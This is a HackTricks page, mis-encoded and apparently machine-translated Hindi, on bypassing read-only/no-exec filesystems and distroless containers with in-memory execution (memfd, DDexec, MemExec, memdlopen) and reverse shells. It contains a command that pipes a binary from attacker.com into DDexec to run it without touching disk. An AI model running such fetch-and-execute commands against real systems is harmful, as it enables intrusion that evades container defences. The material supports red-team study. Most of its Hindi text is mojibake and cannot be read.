# FS рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ: рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП / рдХреЛрдИ рдирд┐рд╖реНрдкрд╛рджрди рдирд╣реАрдВ / рдбрд┐рд╕реНрдЯреНрд░реЛрд▓реИрд╕

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕ-рд╣реИрдХ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдореМрдЦрд┐рдХ рдЖрд╡рд╢реНрдпрдХ рд╣реИ_)ред

{% embed url="https://www.stmcyber.com/careers" %}

## рд╡реАрдбрд┐рдпреЛ

рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╡реАрдбрд┐рдпреЛ рдореЗрдВ рдЖрдк рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХреЛ рдЕрдзрд┐рдХ рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕рдордЭ рд╕рдХрддреЗ рд╣реИрдВ:

* [**DEF CON 31 - Linux рдореЗрдореЛрд░реА рд╣реЗрд░рдлреЗрд░ рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг рдХрд░рдирд╛**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng рдФрд░ рдЗрди-рдореЗрдореЛрд░реА dlopen() рдХреЗ рд╕рд╛рде рд╕реНрдЯреЗрд▓реНрде рдШреБрд╕рдкреИрда - HackTricks рдЯреНрд░реИрдХ 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП / рдХреЛрдИ рдирд┐рд╖реНрдкрд╛рджрди рдирд╣реАрдВ рдкрд░рд┐рджреГрд╢реНрдп

рдпрд╣ рдЕрдзрд┐рдХ рд╕реЗ рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рд╣реЛрддрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдХрд┐ рд▓рд┐рдирдХреНрд╕ рдорд╢реАрдиреЗрдВ **рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП (ro) рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рд╕реБрд░рдХреНрд╖рд╛** рдХреЗ рд╕рд╛рде рдорд╛рдЙрдВрдЯ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ ro рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдирд╛ **`readOnlyRootFilesystem: true`** рдХреЛ `securitycontext` рдореЗрдВ рд╕реЗрдЯ рдХрд░рдиреЗ рдЬрд┐рддрдирд╛ рдЖрд╕рд╛рди рд╣реИ:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

рд╣рд╛рд▓рд╛рдВрдХрд┐, рднрд▓реЗ рд╣реА рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА ro рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХреА рдЧрдИ рд╣реЛ, **`/dev/shm`** рдЕрднреА рднреА рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЧрд▓рдд рд╣реИ рдХрд┐ рд╣рдо рдбрд┐рд╕реНрдХ рдореЗрдВ рдХреБрдЫ рднреА рдирд╣реАрдВ рд▓рд┐рдЦ рд╕рдХрддреЗред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдлрд╝реЛрд▓реНрдбрд░ **рдХреЛрдИ рдирд┐рд╖реНрдкрд╛рджрди рд╕реБрд░рдХреНрд╖рд╛** рдХреЗ рд╕рд╛рде рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдпрд╣рд╛рдБ рдПрдХ рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ**ред

{% hint style="warning" %}
рд░реЗрдб рдЯреАрдо рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдпрд╣ **рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЬрдЯрд┐рд▓ рдмрдирд╛рддрд╛ рд╣реИ** рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдирд╣реАрдВ рд╣реИрдВ (рдЬреИрд╕реЗ рдмреИрдХрдбреЛрд░ рдпрд╛ `kubectl` рдЬреИрд╕реЗ рдПрдиреНрдпреВрдорд░реЗрдЯрд░)ред
{% endhint %}

## рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рдмрд╛рдпрдкрд╛рд╕: рд╕реНрдХреНрд░рд┐рдкреНрдЯ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдореИрдВрдиреЗ рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛, рдЖрдк **рдХрд┐рд╕реА рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрдм рддрдХ рдХрд┐ рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╣реЛ, рдЬреИрд╕реЗ рдХрд┐ **рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдпрджрд┐ `sh` рдореМрдЬреВрдж рд╣реИ рдпрд╛ **рдкрд╛рдпрдерди** **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдпрджрд┐ `python` рд╕реНрдерд╛рдкрд┐рдд рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдЖрдкрдХреЗ рдмрд╛рдЗрдирд░реА рдмреИрдХрдбреЛрд░ рдпрд╛ рдЕрдиреНрдп рдмрд╛рдЗрдирд░реА рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИред

## рдореЗрдореЛрд░реА рдмрд╛рдпрдкрд╛рд╕

рдпрджрд┐ рдЖрдк рдПрдХ рдмрд╛рдЗрдирд░реА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗ рд░рд╣реА рд╣реИ, рддреЛ рдРрд╕рд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ **рдЗрд╕реЗ рдореЗрдореЛрд░реА рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛**, рдХреНрдпреЛрдВрдХрд┐ **рд╕реБрд░рдХреНрд╖рд╛рдПрдБ рд╡рд╣рд╛рдБ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВ**ред

### FD + exec syscall рдмрд╛рдпрдкрд╛рд╕

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬрди рд╣реИрдВ, рдЬреИрд╕реЗ **Python**, **Perl**, рдпрд╛ **Ruby**, рддреЛ рдЖрдк рдореЗрдореЛрд░реА рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдПрдХ рдореЗрдореЛрд░реА рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ (`create_memfd` syscall) рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдЙрди рд╕реБрд░рдХреНрд╖рд╛ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ **`exec` syscall** рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ **fd рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдЗрд╕реЗ рдПрдХ рдмрд╛рдЗрдирд░реА рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рднрд╛рд╖рд╛ рдореЗрдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ **рдмрд╛рдЗрдирд░реА рд╕рдВрдХреБрдЪрд┐рдд рдФрд░ b64 рдПрдиреНрдХреЛрдбреЗрдб** рд╣реЛрдЧреА рдФрд░ рдЗрд╕реЗ **рдбрд┐рдХреЛрдб рдФрд░ рдЕрдирдХрдВрдкреНрд░реЗрд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢ рд╣реЛрдВрдЧреЗ, рдПрдХ **fd** рдореЗрдВ рдЬреЛ `create_memfd` syscall рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **exec** syscall рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

{% hint style="warning" %}
рдпрд╣ рдЕрдиреНрдп рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ рдЬреИрд╕реЗ PHP рдпрд╛ Node рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реЗ рдХрдЪреНрдЪреЗ syscalls рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП `create_memfd` рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ **рдореЗрдореЛрд░реА fd** рдмрдирд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдирд╣реАрдВ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, `/dev/shm` рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде рдПрдХ **рдирд┐рдпрдорд┐рдд fd** рдмрдирд╛рдирд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ **рдХреЛрдИ рдирд┐рд╖реНрдкрд╛рджрди рд╕реБрд░рдХреНрд╖рд╛** рд▓рд╛рдЧреВ рд╣реЛрдЧреАред
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ **рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдкреНрд░реЛрд╕реЗрд╕ рдХреА рдореЗрдореЛрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЗрд╕рдХреЗ **`/proc/self/mem`** рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗред

рдЗрд╕рд▓рд┐рдП, **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣реЗ рдЕрд╕реЗрдВрдмрд▓реА рдХреЛрдб рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реБрдП**, рдЖрдк рдПрдХ **рд╢реЗрд▓рдХреЛрдб** рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ "рдореНрдпреВрдЯ" рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдХреЛрдИ рднреА рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред

{% hint style="success" %}
**DDexec / EverythingExec** рдЖрдкрдХреЛ **рдореЗрдореЛрд░реА** рд╕реЗ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ **рд╢реЗрд▓рдХреЛрдб** рдпрд╛ **рдХреЛрдИ рдмрд╛рдЗрдирд░реА** рд▓реЛрдб рдФрд░ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec рдХрд╛ рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реИред рдпрд╣ рдПрдХ **DDexec рд╢реЗрд▓рдХреЛрдб рдбреЗрдореЛрдирд╛рдЗрдЬреНрдб** рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк **рдПрдХ рдЕрд▓рдЧ рдмрд╛рдЗрдирд░реА рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ DDexec рдХреЛ рдлрд┐рд░ рд╕реЗ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдЖрдк рдмрд╕ DDexec рддрдХрдиреАрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ memexec рд╢реЗрд▓рдХреЛрдб рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ **рдирдП рдмрд╛рдЗрдирд░реА рд▓реЛрдб рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдбреЗрдореЛрди рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЖрдк [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) рдкрд░ **memexec рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ PHP рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рд╕реЗ рдмрд╛рдЗрдирд░реА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### Memdlopen

DDexec рдХреЗ рд╕рдорд╛рди рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд╕рд╛рде, [**memdlopen**](https://github.com/arget13/memdlopen) рддрдХрдиреАрдХ **рдмрд╛рдЗрдирд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛** рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ рддрд╛рдХрд┐ рдмрд╛рдж рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрд╣ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рднреА рджреЗ рд╕рдХрддреА рд╣реИред

## Distroless Bypass

### What is distroless

Distroless рдХрдВрдЯреЗрдирд░ рдХреЗрд╡рд▓ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рд╕реЗрд╡рд╛ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдиреНрдпреВрдирддрдо рдШрдЯрдХ** рд╣реЛрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдФрд░ рд░рдирдЯрд╛рдЗрдо рдирд┐рд░реНрднрд░рддрд╛рдПрдБ, рд▓реЗрдХрд┐рди рдкреИрдХреЗрдЬ рдкреНрд░рдмрдВрдзрдХ, рд╢реЗрд▓, рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдЙрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдЬреИрд╕реЗ рдмрдбрд╝реЗ рдШрдЯрдХреЛрдВ рдХреЛ рдмрд╛рд╣рд░ рдХрд░рддреЗ рд╣реИрдВред

Distroless рдХрдВрдЯреЗрдирд░реЛрдВ рдХрд╛ рд▓рдХреНрд╖реНрдп **рдЕрдирд╛рд╡рд╢реНрдпрдХ рдШрдЯрдХреЛрдВ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХреЛ рдХрдо рдХрд░рдирд╛** рдФрд░ рдЙрди рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рдХрдо рдХрд░рдирд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### Reverse Shell

рдПрдХ distroless рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЖрдк **рд╢рд╛рдпрдж `sh` рдпрд╛ `bash` рднреА рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ** рддрд╛рдХрд┐ рдПрдХ рдирд┐рдпрдорд┐рдд рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЖрдк `ls`, `whoami`, `id` рдЬреИрд╕реЗ рдмрд╛рдЗрдирд░реА рднреА рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ... рд╕рдм рдХреБрдЫ рдЬреЛ рдЖрдк рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЪрд▓рд╛рддреЗ рд╣реИрдВред

{% hint style="warning" %}
рдЗрд╕рд▓рд┐рдП, рдЖрдк **рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдпрд╛ **рд╕рд┐рд╕реНрдЯрдо рдХреА рдЧрдгрдирд╛** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо **рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ** рдЬреИрд╕реЗ рдЖрдк рдЖрдорддреМрд░ рдкрд░ рдХрд░рддреЗ рд╣реИрдВред
{% endhint %}

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрдВрдЯреЗрдирд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдлреНрд▓рд╛рд╕реНрдХ рд╡реЗрдм рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдлрд┐рд░ рдкрд╛рдпрдерди рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рдФрд░ рдЗрд╕рд▓рд┐рдП рдЖрдк рдПрдХ **Python рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдпрд╣ рдиреЛрдб рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ рдиреЛрдб рд░рд┐рд╡ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ **рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛** рдХреЗ рд╕рд╛рде рднреА рдпрд╣реА рд╣реИред

{% hint style="success" %}
рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо рдХреА рдЧрдгрдирд╛** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рднрд╛рд╖рд╛ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред
{% endhint %}

рдпрджрд┐ **рдХреЛрдИ `read-only/no-exec`** рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдк рдЕрдкрдиреЗ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЕрдкрдиреЗ рдмрд╛рдЗрдирд░реА рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдЙрдиреНрд╣реЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="success" %}
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рдпреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЖрдорддреМрд░ рдкрд░ рдореМрдЬреВрдж рд╣реЛрдВрдЧреА, рд▓реЗрдХрд┐рди рдЖрдк **рдкрд┐рдЫрд▓реА рдореЗрдореЛрд░реА рдирд┐рд╖реНрдкрд╛рджрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

